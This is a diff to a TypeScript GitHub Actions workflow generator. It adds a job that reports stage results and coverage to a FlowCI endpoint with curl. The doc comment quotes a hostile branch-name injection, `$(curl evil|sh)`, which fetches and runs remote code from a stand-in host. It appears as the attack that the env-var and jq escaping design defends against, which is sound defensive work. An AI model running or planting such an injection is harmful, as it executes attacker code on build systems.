@@ -259,14 +259,18 @@ export function buildStagedWorkflowBundle(
               SONAR_ORGANIZATION: '${{ secrets.SONAR_ORGANIZATION }}',
             },
           },
-          'report-results': reportingJob('quality', [
-            'validate-access',
-            'branch-policy',
-            testJobId,
-            'lint',
-            'security',
-            'sonar',
-          ]),
+          'report-results': reportingJob(
+            'quality',
+            [
+              'validate-access',
+              'branch-policy',
+              testJobId,
+              'lint',
+              'security',
+              'sonar',
+            ],
+            { testJobId },
+          ),
         },
       }),
     },
@@ -318,7 +322,12 @@ export function buildStagedWorkflowBundle(
                 centralWorkflowRef,
               )
             : deploymentProvider === 'render'
-              ? { 'deploy-render': renderDeployJob(serviceName, centralWorkflowRef) }
+              ? {
+                  'deploy-render': renderDeployJob(
+                    serviceName,
+                    centralWorkflowRef,
+                  ),
+                }
               : {}),
           'promote-to-uat': promotionJob(
             'test-to-uat',
@@ -671,6 +680,117 @@ function renderDeployJobs(
         ];
       }),
   );
+}
+
+/**
+ * Best-effort reporting step that POSTs structured pipeline results to the
+ * FlowCI platform after each stage. Runs with `if: always()` so it fires on
+ * success, failure, and cancellation. The curl uses `--max-time 5` and falls
+ * back to a warning annotation on any error so the pipeline never fails due to
+ * a reporting outage.
+ *
+ * Security: all GitHub context values (`github.repository`, `github.run_id`,
+ * branch names, SHAs) are mapped to shell env vars in the step `env:` block
+ * and referenced only as double-quoted shell variables inside the `run:` script.
+ * JSON is assembled with `jq --arg` / `--argjson` so hostile branch names
+ * (e.g. `$(curl evil|sh)`) cannot escape the string boundary.
+ *
+ * The quality stage populates `results.coverage` from the upstream test job's
+ * `coverage-percent` output and the branch-policy `coverage-threshold` output.
+ * Both are passed via env vars and validated as numeric before inclusion so an
+ * absent or "unknown" value never corrupts the payload. All other stages send
+ * an empty `results: {}`.
+ *
+ * Stage conclusion is derived from the upstream `needs.*.result` context (not
+ * `job.status`, which only reflects this reporting job's own outcome).
+ */
+function reportingJob(
+  stage: WorkflowStage,
+  needs: string[],
+  opts?: { testJobId?: string },
+) {
+  const isQuality = stage === 'quality';
+  const testJobId = opts?.testJobId;
+
+  // env vars injected into the step — NO ${{ }} inside the run: script
+  const stepEnv: Record<string, string> = {
+    CI_TOKEN: '${{ secrets.CI_TOKEN }}',
+    CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
+    GH_REPO: '${{ github.repository }}',
+    GH_BRANCH: `\${{ ${BRANCH_EXPR} }}`,
+    GH_SHA: HEAD_SHA_EXPR,
+    GH_RUN_ID: '${{ github.run_id }}',
+    STAGE_FAILED: "${{ contains(needs.*.result, 'failure') }}",
+    STAGE_CANCELLED: "${{ contains(needs.*.result, 'cancelled') }}",
+  };
+
+  if (isQuality && testJobId) {
+    stepEnv['COVERAGE_PCT'] =
+      `\${{ needs.${testJobId}.outputs.coverage-percent }}`;
+    stepEnv['COVERAGE_THRESHOLD'] =
+      '${{ needs.branch-policy.outputs.coverage-threshold }}';
+  }
+
+  const scriptLines = [
+    '# Derive stage conclusion from upstream needs results',
+    'if [ "$STAGE_FAILED" = "true" ]; then',
+    '  CONCLUSION="failure"',
+    'elif [ "$STAGE_CANCELLED" = "true" ]; then',
+    '  CONCLUSION="cancelled"',
+    'else',
+    '  CONCLUSION="success"',
+    'fi',
+    '',
+    '# Build results sub-object (quality stage only — reads from job outputs)',
+    'RESULTS="{}"',
+    ...(isQuality && testJobId
+      ? [
+          '',
+          '# Include coverage only when COVERAGE_PCT is a real number',
+          '# (central workflows emit "unknown" when coverage is not available)',
+          'if echo "$COVERAGE_PCT" | grep -qE \'^[0-9]+([.][0-9]+)?$\'; then',
+          '  RESULTS=$(jq -n \\',
+          '    --argjson pct "$COVERAGE_PCT" \\',
+          '    --argjson threshold "${COVERAGE_THRESHOLD:-0}" \\',
+          '    \'{"coverage":{"pct":$pct,"threshold":$threshold}}\')',
+          'fi',
+        ]
+      : []),
+    '',
+    '# Build and POST the payload with jq — no string interpolation of context values',
+    'PAYLOAD=$(jq -n \\',
+    '  --arg repo     "$GH_REPO" \\',
+    '  --arg branch   "$GH_BRANCH" \\',
+    '  --arg sha      "$GH_SHA" \\',
+    '  --argjson runId "$GH_RUN_ID" \\',
+    `  --arg stage    "${stage}" \\`,
+    '  --arg conclusion "$CONCLUSION" \\',
+    '  --argjson results "$RESULTS" \\',
+    "  '{repoFullName:$repo,branch:$branch,commitSha:$sha,runId:$runId,stage:$stage,conclusion:$conclusion,results:$results}')",
+    'curl -sf --max-time 5 \\',
+    '  -X POST "$CI_REPORT_URL" \\',
+    '  -H "Authorization: Bearer $CI_TOKEN" \\',
+    '  -H "Content-Type: application/json" \\',
+    '  -d "$PAYLOAD" \\',
+    '  || echo "::warning::Failed to report pipeline results to FlowCI"',
+  ];
+
+  return {
+    if: '${{ always() }}',
+    needs,
+    runs_on: 'ubuntu-latest',
+    env: {
+      CI_TOKEN: '${{ secrets.CI_TOKEN }}',
+      CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
+    },
+    steps: [
+      {
+        name: 'Report stage results to FlowCI',
+        env: stepEnv,
+        run: scriptLines.join('\n'),
+      },
+    ],
+  };
 }
 
 function dumpWorkflow(workflow: Record<string, unknown>): string {
